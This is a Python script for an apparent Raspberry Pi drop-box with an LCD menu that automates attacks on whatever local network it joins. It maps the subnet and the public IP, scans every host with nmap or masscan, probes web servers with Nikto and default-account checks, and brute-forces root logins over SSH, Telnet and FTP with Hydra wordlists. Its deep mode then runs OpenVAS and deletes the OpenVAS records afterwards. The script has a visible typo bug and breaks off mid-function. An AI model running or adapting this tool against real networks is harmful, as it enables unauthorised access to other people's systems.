#!/usr/bin/python
# -*- coding: iso-8859-1 -*-
import os
import sys
import subprocess
import time

import smtplib
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from smtplib import SMTP

import subprocess
from subprocess import PIPE
from time import sleep
import Adafruit_CharLCD as LCD
import datetime


def webservers_nmap():
    global WEBSERVERS_FOUND

    #Finds mentioning of port 80 in tmp/TCP_PORT_RESULTS, which is the TCP scan made previously

    PORT_80 = subprocess.Popen("cat tmp/TCP_PORT_RESULTS | awk '/ 80\/open/ {print $2,$4}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
    #changes the word 'ports:' to ':80'. This is done so that the resulti file would have IPs in IP:80 format
    PORT_80 = PORT_80.replace('Ports:', ':80')
    #Removes the space that is between IP and :80
    PORT_80 = PORT_80.replace(' ', '')
    #Removes the empty linebreaks
    PORT_80 = PORT_80.rstrip()
    #Creates another variable that has the same IP written down but ':80' removed. This is done because the Nmap http-attack script requires just the IPs, without port numbers
    PORT_80_NMAP = PORT_80.replace(':80','')

    #Same is done for port 81,82, 8080 and 443

    PORT_81 = subprocess.Popen("cat tmp/TCP_PORT_RESULTS | awk '/ 81\/open/ {print $2,$4}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
    PORT_81 = PORT_81.replace('Ports:', ':81')
    PORT_81 = PORT_81.replace(' ', '')
    PORT_81 = PORT_81.rstrip()
    PORT_81_NMAP = PORT_81.replace(':81','')    

    PORT_82 = subprocess.Popen("cat tmp/TCP_PORT_RESULTS | awk '/ 82\/open/ {print $2,$4}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
    PORT_82 = PORT_82.replace('Ports:', ':82')
    PORT_82 = PORT_82.replace(' ', '')
    PORT_82 = PORT_82.rstrip()
    PORT_82_NMAP = PORT_82.replace(':82','')    

    PORT_8080 = subprocess.Popen("cat tmp/TCP_PORT_RESULTS | awk '/ 8080\/open/ {print $2,$4}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
    PORT_8080 = PORT_8080.replace('Ports:', ':8080')
    PORT_8080 = PORT_8080.replace(' ', '')
    PORT_8080 = PORT_8080.rstrip()
    PORT_8080_NMAP = PORT_8080.replace(':8080','')    
    
    PORT_443 = subprocess.Popen("cat tmp/TCP_PORT_RESULTS | awk '/ 443\/open/ {print $2,$4}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
    PORT_443 = PORT_443.replace('Ports:', ':443')
    PORT_443 = PORT_443.replace(' ', '')
    PORT_443 = PORT_443.rstrip()
    PORT_443_NMAP = PORT_443.replace(':443','')
    
    WEBSERVERS = ""
    WEBSERVERS_NMAP = ""

    #If a port is mentioned in the variable, write it down to the list of all ports 
    if ":80" in PORT_80:
       WEBSERVERS = WEBSERVERS + PORT_80 + ('\n')
       WEBSERVERS_NMAP = WEBSERVERS_NMAP + PORT_80_NMAP + ('\n')
    if ":81" in PORT_81:
       WEBSERVERS = WEBSERVERS + PORT_81 + ('\n')
       WEBSERVERS_NMAP = WEBSERVERS_NMAP + PORT_81_NMAP + ('\n')
    if ":8080" in PORT_8080:
       WEBSERVERS = WEBSERVERS + PORT_8080 + ('\n')
       WEBSERVERS_NMAP = WEBSERVERS_NMAP + PORT_8080_NMAP + ('\n')
    if ":443" in PORT_443:
       WEBSERVERS = WEBSERVERS + PORT_443 + ('\n')
       WEBSERVERS_NMAP = WEBSERVERS_NMAP + PORT_443_NMAP + ('\n')
       
    WEBSERVERS = WEBSERVERS.rstrip()
    WEBSERVERS_NMAP = WEBSERVERS_NMAP.rstrip()
    WEBSERVERS_NMAP_DUPLICATES = ""
    WEBSERVERS_NMAP_NO_DUPLICATES = ""
    
    #This code block removes any duplicate IPs that were noted down.
    WEBSERVERS_NMAP_DUPLICATES = WEBSERVERS_NMAP.split()
    WEBSERVERS_NMAP_DUPLICATES = set(WEBSERVERS_NMAP_DUPLICATES)
    WEBSERVERS_NMAP_NO_DUPLICATES = '\n'.join(WEBSERVERS_NMAP_DUPLICATES)

    #If the webservers variable is empty - no webservers were detected on the network
    if WEBSERVERS == "":
       WEBSERVERS_FOUND = 0
       print("No webservers found")
       
    #If any webservers were found,write the results to tmp/webservers (will contain Ips in IP:Port format) and tmp/webservers_nmap_no_dups (Contains just the IPs, without duplicates)
       
    else:
       WEBSERVERS_FOUND = 1
       print("Webservers found")
       text_file = open("tmp/webservers", "w")
       text_file.write(WEBSERVERS)
       text_file.close()    
       
       text_file = open("tmp/webservers_nmap_no_dups", "w")
       text_file.write(WEBSERVERS_NMAP_NO_DUPLICATES)
       text_file.close()       

#no ports needed, only IPs
def ssh_nmap():
    global SSH_HOSTS_FOUND
    
    SSH_HOSTS = subprocess.Popen("cat tmp/TCP_PORT_RESULTS | awk '/ 22\/open/ {print $2}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
    SSH_HOSTS = SSH_HOSTS.rstrip()

    if SSH_HOSTS == "":
       SSH_HOSTS_FOUND = 0
       print("No hosts have ssh open")
    else:
       SSH_HOSTS_FOUND = 1 
       print("SSH hosts found")
       text_file = open("tmp/ssh_hosts", "w")
       text_file.write(SSH_HOSTS)
       text_file.close()
       
def telnet_nmap():
    global TELNET_HOSTS_FOUND

    TELNET_HOSTS = subprocess.Popen("cat tmp/TCP_PORT_RESULTS | awk '/ 23\/open/ {print $2}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
    TELNET_HOSTS = TELNET_HOSTS.rstrip()

    if TELNET_HOSTS == "":
       TELNET_HOSTS_FOUND = 0
       print("No hosts have telnet open")
    else:
       TELNET_HOSTS_FOUND = 1 
       print("TELNET hosts found")
       text_file = open("tmp/telnet_hosts", "w")
       text_file.write(TELNET_HOSTS)
       text_file.close()


def ftp_nmap():
    global FTP_HOSTS_FOUND

    FTP_HOSTS = subprocess.Popen("cat tmp/TCP_PORT_RESULTS | awk '/ 21\/open/ {print $2}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
    FTP_HOSTS = FTP_HOSTS.rstrip()

    if FTP_HOSTS == "":
       FTP_HOSTS_FOUND = 0
       print("No hosts have ftp open")
    else:
       FTP_HOSTS_FOUND = 1 
       print("FTP hosts found")
       text_file = open("tmp/ftp_hosts", "w")
       text_file.write(FTP_HOSTS)
       text_file.close()

    
def main_menu():
    
 global DEEP_STARTED
 global QUICK_STARTED
 DEEP_STARTED = 0
 QUICK_STARTED = 0
 
 lcd.clear()
 lcd.set_color (1.0, 1.0, 1.0)
 MENU = 1
 MENU_DISPLAYED = 0
 lcd.create_char(1, [0,0,4,14,31,0,0,0])
 lcd.create_char(2, [0,0,31,14,4,0,0,0])
 lcd.clear()
 
 timer_start = time.time()
 time_passed = 0
 while not lcd.is_pressed(LCD.SELECT):

      time_passed = time.time() - timer_start
      
      if lcd.is_pressed(LCD.UP):
         sleep(0.5)
         lcd.clear()
         MENU = MENU - 1
         MENU_DISPLAYED = 0

      if lcd.is_pressed(LCD.DOWN):
         sleep(0.5)
         lcd.clear()
         MENU = MENU + 1
         MENU_DISPLAYED = 0

      if MENU == 1:
         if MENU_DISPLAYED == 0:
            lcd.message('Check Status\nUse \x01/\x02/SELECT')
            MENU_DISPLAYED = 1


      if MENU == 2:
         if MENU_DISPLAYED == 0:
            lcd.message('QCK Scan/Attack\nUse \x01/\x02/SELECT')
            MENU_DISPLAYED = 1


      if MENU == 3:
         if MENU_DISPLAYED == 0:
            lcd.message('Deep Scan/Attack\nUse \x01/\x02/SELECT')
            MENU_DISPLAYED = 1

      if MENU == 4:
         if MENU_DISPLAYED == 0:
            lcd.message('Exit\nUse \x01/\x02/SELECT')
            MENU_DISPLAYED = 1
      if time_passed > 180:
         shutdown() 
 
      if MENU > 4:
         MENU = 1
         MENU_DISPLAYED = 0

      if MENU <1:
         MENU = 4
         MENU_DISPLAYED = 0

 lcd.clear()
 time_passed = 0
 if MENU == 1:
    status()
 if MENU == 2:
    quick()
 if MENU == 3:
    deep()
 if MENU == 4:
    shutdown() 


def reconaissance():
 lcd.clear()
 lcd.set_color (0.0, 1.0, 1.0)
 lcd.message ('Starting\nReconnaissance')
 sleep(2)

 global IP
 global MASK
 global LOCAL_IP
 global LOCAL_SUBNET
 global PUBLIC_IP
 global REVERSE_DNS
 global HOST_AMOUNT
 global DEFAULT_GATEWAY
 global INET_CONNECTION
 global TRACEROUTE
 global WHOIS

 
 #Get the IP Address from ifconfig eth0
 lcd.clear()
 lcd.message ('Reconnaissance\n[--------------]')
 IP = subprocess.Popen("ifconfig eth0 | awk -F\"[: ]+\" '/inet addr:/ {print $4}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
 IP = IP.rstrip() #removes all spaces from IP

 #Get the raw subnet mask
 MASK = subprocess.Popen("ifconfig eth0 | awk -F\"[: ]+\" '/inet addr:/ {print $8}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
 MASK = MASK.rstrip()
 lcd.clear()
 lcd.message ('Reconnaissance\n[=-------------]')

 #Combine the IP and MASK strings to be used later by ipcalc
 LOCAL_IP = IP + " " + MASK

 #Use IP calc to calculate the CIDR that will be used by nmap
 LOCAL_SUBNET = subprocess.Popen("ipcalc " + LOCAL_IP + " | awk -F \"[: ]+\" '/Network:/ {print $2}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
 LOCAL_SUBNET = LOCAL_SUBNET.rstrip()
 print "Your Local IP is " + LOCAL_SUBNET
 lcd.clear()
 lcd.message ('Reconnaissance\n[===-----------]')

 #Get default Gateway
 DEFAULT_GATEWAY = subprocess.Popen("ip route show default | awk '/default/ {print $3}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
 DEFAULT_GATEWAY = DEFAULT_GATEWAY.rstrip()
 print "Default Gateway: " + DEFAULT_GATEWAY
 
 print "Checking Internet Connection"
 #Checks internet connection by trying to access google.com
 CHK_INET = subprocess.Popen("wget -q --tries=10 --timeout=20 --spider http://google.com", shell=True, stdout=subprocess.PIPE)
 streamdata = CHK_INET.communicate()[0]
 #Checks the wget exit code
 EXIT_STATUS = CHK_INET.returncode
 lcd.clear()
 lcd.message ('Reconnaissance\n[=====---------]')

 #If the exit code is 0 - wget successfully accessed google.com
 if EXIT_STATUS == 0:
   print "Connected to Internet"
   INET_CONNECTION = 1
   #Get the public IP from externalip.com
   TRACEROUTE = subprocess.Popen("traceroute 8.8.8.8", shell=True, stdout=subprocess.PIPE).communicate()[0]
   PUBLIC_IP = subprocess.Popen("wget -qO- --tries=3 --timeout=5 http://myexternalip.com/raw", shell=True, stdout=subprocess.PIPE)
   streamdata = PUBLIC_IP.communicate()[0]
   EXIT_STATUS = PUBLIC_IP.returncode
   lcd.clear()
   lcd.message ('Reconnaissance\n[======--------]')

   if EXIT_STATUS == 0:
      print "Got IP from externalip.com"
      PUBLIC_IP = streamdata.rstrip()
      lcd.clear()
      lcd.message ('Reconnaissance\n[=======-------]')
      
   else:
      print "Could not reach externalip.com, trying ipinfo.io"
      PUBLIC_IP = subprocess.Popen("wget -qO- http://ipinfo.io/ip", shell=True, stdout=subprocess.PIPE).communicate()[0]
      print "Got IP from ininfo.io/ip"
      PUBLIC_IP = PUBLIC_IP.rstrip()
      lcd.clear()
      lcd.message ('Reconnaissance\n[=======-------]')
      
   print "Your Public IP is " + PUBLIC_IP
   lcd.clear()
   lcd.message ('Reconnaissance\n[=========-----]')
   print "Acquiring WHOIS info..."
   WHOIS = subprocess.Popen("whois " + PUBLIC_IP, shell=True, stdout=subprocess.PIPE).communicate()[0]
   REVERSE_DNS = subprocess.Popen("dig -x " + PUBLIC_IP, shell=True, stdout=subprocess.PIPE).communicate()[0]
   lcd.clear()
   lcd.message ('Reconnaissance\n[===========---]')
 else:
   print "No Internet Connection"
   INET_CONNECTION = 0
   lcd.clear()
   lcd.message ('Reconnaissance\n[===========---]')
   
 #Checks the number of hosts in the network
 lcd.clear()
 lcd.message ('Reconnaissance\n[=============-]')
 HOST_AMOUNT = subprocess.Popen("nmap -sP " + LOCAL_SUBNET + " --exclude " + IP + " | awk -F \"[( ]+\" '/Nmap done:/ {print $6}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
 HOST_AMOUNT = HOST_AMOUNT.rstrip()
 print "Amount of Hosts that are UP: " + str(HOST_AMOUNT)

 lcd.clear()
 lcd.message ('Reconnaissance\n[==============]')
 sleep (2)
 print "Reconaissance phase completed. What would you like to do next?"


def attack():
    
      if WEBSERVERS_FOUND == 1:
         print "Webservers found, launching nmap webserver attack"
         NMAP_WEBSERVER_ATTACK = subprocess.Popen("nmap --script http-default-accounts -d -iL tmp/webservers_nmap_no_dups > reports/nmap_webserver_attack.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
         print "Starting Nikto attack"
         if QUICK_STARTED == 1:
            NIKTO = subprocess.Popen("perl /root/Downloads/nikto-master/program/nikto.pl -Tuning 23 -h tmp/webservers -output reports/nikto_results.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
         if DEEP_STARTED == 1:
            NIKTO = subprocess.Popen("perl /root/Downloads/nikto-master/program/nikto.pl -h tmp/webservers -output reports/nikto_results.txt", shell=True, stdout=subprocess.PIPE).communicate()[0] 
      else:
         print "No webservers detected"

      if SSH_HOSTS_FOUND == 1:
         print "SSH Hosts found, launching HYDRA"
         if QUICK_STARTED == 1:
            HYDRA_SSH = subprocess.Popen("hydra -l root -P dictionaries/twitter-banned.txt -M tmp/ssh_hosts -e ns ssh > reports/hydra_ssh_results.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
         if DEEP_STARTED == 1:
            HYDRA_SSH = subprocess.Popen("hydra -l root -P dictionaries/john.txt -M tmp/ssh_hosts -e ns ssh > reports/hydra_ssh_results.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
      else:
         print "No SSH hosts = no hydra attack"

      lcd.clear()
      lcd.message ('QCK Scan/Attack\n[=============-]')
      
      if TELNET_HOSTS_FOUND == 1:
         print "Telnet Hosts found, launching HYDRA"
         if QUICK_STARTED == 1:         
            HYDRA_TELNET = subprocess.Popen("hydra -l root -P dictionaries/twitter-banned.txt -M tmp/telnet_hosts -e ns telnet > reports/hydra_telnet_results.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
         if DEEP_STARTED == 1:
            HYDRA_TELNET = subprocess.Popen("hydra -l root -P dictionaries/john.txt -M tmp/telnet_hosts -e ns telnet > reports/hydra_telnet_results.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
      else:
         print "No TELNET HOSTS = no hydra attack"

      if FTP_HOSTS_FOUND == 1:
         print "FTP Hosts found, launching HYDRA"
         if QUICK_STARTED == 1:               
            HYDRA_FTP = subprocess.Popen("hydra -l root -P dictionaries/twitter-banned.txt -M tmp/ftp_hosts -e ns ftp > reports/hydra_ftp_results.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
         if DEEP_STARTED == 1:
            HYDRA_FTP = subprocess.Popen("hydra -l root -P dictionaries/john.txt -M tmp/ftp_hosts -e ns ftp > reports/hydra_ftp_results.txt", shell=True, stdout=subprocess.PIPE).communicate()[0] 
      else:
         print "No FTP HOSTS = no hydra attack"

                  
      lcd.clear()
      lcd.message ('QCK Scan/Attack\n[==============]')
      
 
def quick():
      global QUICK_STARTED
      global QUICK_COMPLETED
      global TIMESTAMP_START
      global TIMESTAMP_END
      TIMESTAMP_START = datetime.datetime.now().strftime("%A, %d. %B %Y %I:%M%p")
      QUICK_STARTED = 1
      
      lcd.clear()
      lcd.set_color (0.0, 1.0, 1.0)

      lcd.message('Starting Quick\nScan and Attack')
      sleep(2)
      
      lcd.clear()
      lcd.message ('QCK Scan/Attack\n[--------------]')
      
      #Get IP's of hosts that are currently UP and write them in the CREATED FILE (CURRENT_IPS)
      lcd.message ('QCK Scan/Attack\n[=-------------]')

      lcd.clear()
      lcd.message ('QCK Scan/Attack\n[====----------]')
      if int(HOST_AMOUNT) <= 30:
         print "Less or equal to 30 hosts"
         
         lcd.clear()
         lcd.message ('QCK Scan/Attack\n[======--------]')

         QUICK_TCP_SCAN = subprocess.Popen("nmap -sS -PR -T 4 --top-ports 10000 " + LOCAL_SUBNET + " -oG tmp/TCP_PORT_RESULTS -oN reports/tcp_port_report.txt --exclude " + IP, shell=True, stdout=subprocess.PIPE).communicate()[0]

         lcd.clear()
         lcd.message ('QCK Scan/Attack\n[========------]')
         
         webservers_nmap()
         ssh_nmap()
         telnet_nmap()
         ftp_nmap()
         
         lcd.clear()
         lcd.message ('QCK Scan/Attack\n[===========---]')

      else:
         lcd.clear()
         lcd.message ('QCK Scan/Attack\n[======--------]')
         print "More than 30 hosts"
         CURRENT_HOSTS = subprocess.Popen("nmap -sP -PR -oG - " + LOCAL_SUBNET + " | awk '/Up/{print $2}' > tmp/CURRENT_IPS", shell=True, stdout=subprocess.PIPE).communicate()[0]
         lcd.clear()
         lcd.message ('QCK Scan/Attack\n[========------]')
         QUICK_TCP_SCAN = subprocess.Popen("masscan -Pn --banners -p 0-65535 --rate 1500 -iL tmp/CURRENT_IPS --output-format grepable --output-filename tmp/TCP_PORT_RESULTS --exclude " + IP, shell=True, stdout=subprocess.PIPE).communicate()[0]
         lcd.clear()
         lcd.message ('QCK Scan/Attack\n[===========---]')
         webservers_nmap()
         ssh_nmap()
         telnet_nmap()
         ftp_nmap()
         
      lcd.clear()
      lcd.message ('QCK Scan/Attack\n[============--]')

      attack()

      
      QUICK_COMPLETED = 'Yes'
      TIMESTAMP_END = datetime.datetime.now().strftime("%A, %d. %B %Y %I:%M%p")
      report()
      QUICK_STARTED = 0      
      main_menu()


def deep():
    global DEEP_STARTED
    global DEEP_COMPLETED
    global TIMESTAMP_START
    global TIMESTAMP_END
    TIMESTAMP_START = datetime.datetime.now().strftime("%A, %d. %B %Y %I:%M%p")
    DEEP_STARTED = 1
    
    lcd.clear()
    lcd.set_color (0.0, 1.0, 1.0)
    lcd.message('Starting Deep\nScan and Attack')
    sleep(2)

    lcd.clear()
    lcd.message ('Deep Scan/Attack\n[==------------]')
    DEEP_TCP_SCAN = subprocess.Popen("nmap -sS -PR -A -O -T 4 -p- -oG tmp/TCP_PORT_RESULTS -oN reports/tcp_port_report.txt " + LOCAL_SUBNET + " --exclude " + IP, shell=True, stdout=subprocess.PIPE).communicate()[0]
    lcd.clear()
    lcd.message ('Deep Scan/Attack\n[=====---------]')
    DEEP_UDP_SCAN = subprocess.Popen("nmap -sU -PR -A -p 123,161,53,111,137,500,69,28960,19,2302,27960,13,12203,2049,1027,29072,29070,28786,5121,1000,63392,635,1026,6112,135,17,40000,2406,37,6500,12300,138,28964,8888,23000,21528,12345,1028,28962,2304,28961,2306,2404,2303,29961,517,44462,34818,34321,27965 -oN reports/udp_port_report.txt " + LOCAL_SUBNET + " --exclude " +  IP, shell=True, stdout=subprocess.PIPE).communicate()[0]
    lcd.clear()
    lcd.message ('Deep Scan/Attack\n[========------]')

    webservers_nmap()
    ssh_nmap()
    telnet_nmap()
    ftp_nmap()
    
    lcd.clear()
    lcd.message ('Deep Scan/Attack\n[==========----]')
    
    attack()
    
    lcd.clear()  
    lcd.message ('Deep Scan/Attack\nStarting OpenVASsd')
    sleep(2)
    
    ####OPENVAS STARTS HERE###
    FAIL = "Failed to acquire socket."
    print "Starting openvassd"
    sleep(5)
    START_OPENVASSD = subprocess.Popen("openvassd", shell=True, stdout=subprocess.PIPE).communicate()[0]
    sleep(5)
    print "Checking openvassd"
    CHECK_OPENVASSD = subprocess.Popen("ps aux | grep openvassd:", shell=True, stdout=subprocess.PIPE).communicate()[0]
    while "Waiting for incoming connections" not in CHECK_OPENVASSD:
          print "Openvas Booting"
          sleep(30)
          CHECK_OPENVASSD = subprocess.Popen("ps aux | grep openvassd:", shell=True, stdout=subprocess.PIPE).communicate()[0]

    lcd.clear()  
    lcd.message ('Deep Scan/Attack\nStarting OpenVASmd')
    sleep(2)
    print "Openvassd booted, starting openvasmd"

    os.system("openvasmd")
    print "Openvasmd booted, sleeping for a minute"
    sleep (100)

    
    print "Waking up, launching nmap"

    CURRENT_HOSTS_OPENVAS = subprocess.Popen("nmap -sP -PR -oG - " + LOCAL_SUBNET + " | awk '/Up/{print $2}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
    CURRENT_HOSTS_OPENVAS = CURRENT_HOSTS_OPENVAS.rstrip()
    print "Nmap Done, continuing"

    lcd.clear()  
    lcd.message ('Deep Scan/Attack\nAdding Targets')
    sleep(2)
    
    ADD_TARGETS = subprocess.Popen("omp --xml=\"<create_target><name>Detected_Targets</name><hosts>" + CURRENT_HOSTS_OPENVAS + "</hosts></create_target>\" | cut -d '\"' -f2", shell=True, stdout=subprocess.PIPE).communicate()[0]
    TARGET_ID = ADD_TARGETS.rstrip()
    if FAIL in TARGET_ID:
       while FAIL in TARGET_ID:
             ADD_TARGETS = subprocess.Popen("omp --xml=\"<create_target><name>Detected_Targets</name><hosts>" + CURRENT_HOSTS_OPENVAS + "</hosts></create_target>\" | cut -d '\"' -f2", shell=True, stdout=subprocess.PIPE).communicate()[0]
             TARGET_ID = ADD_TARGETS.rstrip()
    print "Targets added"

    lcd.clear()  
    lcd.message ('Deep Scan/Attack\nAdding Task')
    sleep(2)
    
    ADD_TASK = subprocess.Popen("omp --xml=\"<create_task><name>Full_n_Fast_Scan</name><comment></comment><config id='daba56c8-73ec-11df-a475-002264764cea'/><target id='" + TARGET_ID + "'/></create_task>\" | cut -d '\"' -f2", shell=True, stdout=subprocess.PIPE).communicate()[0] 
    TASK_ID = ADD_TASK.rstrip()
    if FAIL in TASK_ID:
       while FAIL in TASK_ID:
             ADD_TASK = subprocess.Popen("omp --xml=\"<create_task><name>Full_n_Fast_Scan</name><comment></comment><config id='daba56c8-73ec-11df-a475-002264764cea'/><target id='" + TARGET_ID + "'/></create_task>\" | cut -d '\"' -f2", shell=True, stdout=subprocess.PIPE).communicate()[0] 
             TASK_ID = ADD_TASK.rstrip()         
    print "Task added"

    lcd.clear()  
    lcd.message ('Deep Scan/Attack\nStarting Task')
    sleep(2)
    
    START_TASK = subprocess.Popen("omp --xml=\"<start_task task_id='" + TASK_ID + "'/>\" | awk -F '[><]' '{print $5}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
    REPORT_ID = START_TASK.rstrip()
    if FAIL in REPORT_ID:
       while FAIL in REPORT_ID:
             START_TASK = subprocess.Popen("omp --xml=\"<start_task task_id='" + TASK_ID + "'/>\" | awk -F '[><]' '{print $5}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
             REPORT_ID = START_TASK.rstrip()
    print "Task started"

    CHECK_OPENVAS_PROGRESS = subprocess.Popen("omp -G | grep Full_n_Fast_Scan | cut -d ' ' -f 3,4,5", shell=True, stdout=subprocess.PIPE).communicate()[0]
    CHECK_OPENVAS_PROGRESS = CHECK_OPENVAS_PROGRESS.rstrip()

    while "Done" not in CHECK_OPENVAS_PROGRESS:
        print "Openvas Still Scanning"
        print CHECK_OPENVAS_PROGRESS
        
        lcd.clear()  
        lcd.message ('Openvas Scanning\n' + CHECK_OPENVAS_PROGRESS)
        
        sleep(60)
        CHECK_OPENVAS_PROGRESS = subprocess.Popen("omp -G | grep Full_n_Fast_Scan | cut -d ' ' -f 3,4,5", shell=True, stdout=subprocess.PIPE).communicate()[0]
        CHECK_OPENVAS_PROGRESS = CHECK_OPENVAS_PROGRESS.rstrip()
       
    print "Openvas Scan Completed!"
    
    lcd.clear()  
    lcd.message ('Deep Scan/Attack\nGenerating Report')
    sleep(2)
    
    #print ADD_HOSTS
    print "Getting raw report"
    GET_RAW_REPORT = subprocess.Popen("omp -iX \"<get_reports report_id='" + REPORT_ID + "' format_id='a3810a62-1f62-11e1-9219-406186ea4fc5'/>\" > tmp/report_raw.txt ", shell=True, stdout=subprocess.PIPE).communicate()[0]
    if FAIL in GET_RAW_REPORT:
       while FAIL in GET_RAW_REPORT:
             START_TASK = subprocess.Popen("omp --xml=\"<start_task task_id='" + TASK_ID + "'/>\" | awk -F '[><]' '{print $5}'", shell=True, stdout=subprocess.PIPE).communicate()[0]
             REPORT_ID = START_TASL.rstrip()

    print "Extracting base64 from raw report"         
    EXTRACT_BASE64 = subprocess.Popen("head -n2 tmp/report_raw.txt | cut -d '>' -f2- > tmp/report_base64.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
    print "Converting base64 to file"
    CONVERT_BASE64 = subprocess.Popen("base64 -di tmp/report_base64.txt > reports/report_openvas.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]

    print "Report available!"

    DELETE_TASK = subprocess.Popen("omp -iX \"<delete_task task_id='" + TASK_ID +"'/>\"", shell=True, stdout=subprocess.PIPE).communicate()[0]
    DELETE_TARGETS = subprocess.Popen("omp -iX \"<delete_target target_id='" + TARGET_ID +"'/>\"", shell=True, stdout=subprocess.PIPE).communicate()[0]
    DELETE_REPORT = subprocess.Popen("omp -iX \"<delete_report report_id='" + REPORT_ID +"'/>\"", shell=True, stdout=subprocess.PIPE).communicate()[0]

    print "Openvas Info deleted"
    
    DEEP_COMPLETED = 'Yes'
    TIMESTAMP_END = datetime.datetime.now().strftime("%A, %d. %B %Y %I:%M%p")

    report()
    DEEP_STARTED = 0
    
    main_menu()   


def status():

    lcd.clear()
    lcd.set_color (0.0, 1.0, 1.0)
    
    lcd.message('Local IP:\n' + IP)
    sleep(5)
    lcd.clear()
    lcd.message('Local Subnet:\n' + LOCAL_SUBNET)
    sleep(5)
    lcd.clear()
    if INET_CONNECTION == 1:
       lcd.message('Public IP:\n' + PUBLIC_IP)
    if INET_CONNECTION == 0:
       lcd.message('No Internet\nConnection')
    sleep(5)
    lcd.clear()
    lcd.message('Hosts\nDiscovered: ' + HOST_AMOUNT)
    sleep(5)
    lcd.clear()
    lcd.message('QCK Scan/Attack\nCompleted? ' + QUICK_COMPLETED)
    sleep(5)
    lcd.clear()
    lcd.message('Deep Scan/Attack\nCompleted? ' + DEEP_COMPLETED)
    sleep(5)
    
    main_menu()


def shutdown():
    lcd.clear()
    lcd.set_color (1.0, 0.0, 1.0)
    lcd.message ('See You\nSpace Cowboy...')
    sleep(5)
    lcd.clear()
    lcd.set_backlight(0.0)
    SHUTDOWN = subprocess.Popen("shutdown -h now", shell=True, stdout=subprocess.PIPE).communicate()[0]
    sys.exit()

def report():
    global ENCRYPTED_FILENAME
    
    ENCRYPTED_FILENAME = ""
    
    FINAL_REPORT = open("reports/final_report.txt","w")
    if QUICK_STARTED == 1:
       FINAL_REPORT.write("             *****QUICK SCANNING/ATTACKING REPORT*****\n\n")
       FINAL_REPORT.write("Quick scan/attack was started on " + TIMESTAMP_START +" and was successfully completed on " + TIMESTAMP_END + ".\n\n\n")
       
    if DEEP_STARTED == 1:
       FINAL_REPORT.write("             *****DEEP SCANNING/ATTACKING REPORT*****\n\n")
       FINAL_REPORT.write("Deep scan/attack was started on " + TIMESTAMP_START +" and was successfully completed on " + TIMESTAMP_END + ".\n\n\n")
       
    FINAL_REPORT.write("      Information gathered during Reconaissance stage:\n\n")
    FINAL_REPORT.write("================================================================\n")
    FINAL_REPORT.write("Local IP: " + IP + "\n")
    FINAL_REPORT.write("Subnet Mask: " + MASK + "\n")    
    FINAL_REPORT.write("CIDR address: " + LOCAL_SUBNET + "\n")
    FINAL_REPORT.write("Default Gateway: " + DEFAULT_GATEWAY + "\n")
    FINAL_REPORT.write("Amount of Hosts in Network: " + HOST_AMOUNT + "\n")
    FINAL_REPORT.write("----------------------------------------------------------------\n")
    
    if INET_CONNECTION == 1:
       FINAL_REPORT.write("The device had an established Internet Connection.\n")
       FINAL_REPORT.write("Public IP: " + PUBLIC_IP + "\n")
       FINAL_REPORT.write("----------------------------------------------------------------\n\n")
       FINAL_REPORT.write("Traceroute to Google:\n\n" + TRACEROUTE + ".\n")
       FINAL_REPORT.write("----------------------------------------------------------------\n\n")
       FINAL_REPORT.write("Public IP WHOIS information:\n\n" + WHOIS + ".\n\n")
       FINAL_REPORT.write("Reverse DNS Lookup of Public IP:\n\n" + REVERSE_DNS + ".\n\n\n")
       FINAL_REPORT.write("================================================================\n\n\n")
       
    if INET_CONNECTION == 0:
       FINAL_REPORT.write("The device was not connected to the Internet.\n")
       FINAL_REPORT.write("================================================================\n\n\n")
       
    FINAL_REPORT.write("      Information gathered during Scan and Attack stage:\n\n")
    FINAL_REPORT.write("----------------------------------------------------------------\n")
    FINAL_REPORT.write("Port Scanning Results:\n\n")
    FINAL_REPORT.close()
    
    ADD_TCP_SCAN_INFO = subprocess.Popen("cat reports/tcp_port_report.txt >> reports/final_report.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
    if DEEP_STARTED == 1:
       ADD_UDP_SCAN_INFO = subprocess.Popen("cat reports/udp_port_report.txt >> reports/final_report.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
                   
    if WEBSERVERS_FOUND == 1:
       FINAL_REPORT = open("reports/final_report.txt","a")
       FINAL_REPORT.write("----------------------------------------------------------------\n\n")
       FINAL_REPORT.write("                      Webserver Information:\n\n")
       FINAL_REPORT.write("Nmap webserver attack Results:\n\n")       
       FINAL_REPORT.close()
       ADD_WEBSERVER_NMAP_INFO = subprocess.Popen("cat reports/nmap_webserver_attack.txt >> reports/final_report.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
       
       FINAL_REPORT = open("reports/final_report.txt","a")
       FINAL_REPORT.write("----------------------------------------------------------------\n\n")
       FINAL_REPORT.write("Nikto webserver attack Results:\n\n")       
       FINAL_REPORT.close()
            
       ADD_NIKTO_RESULTS = subprocess.Popen("cat reports/nikto_results.txt >> reports/final_report.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]

    if SSH_HOSTS_FOUND == 1:
       FINAL_REPORT = open("reports/final_report.txt","a")
       FINAL_REPORT.write("Hydra SSH attack Results:\n\n")       
       FINAL_REPORT.close()
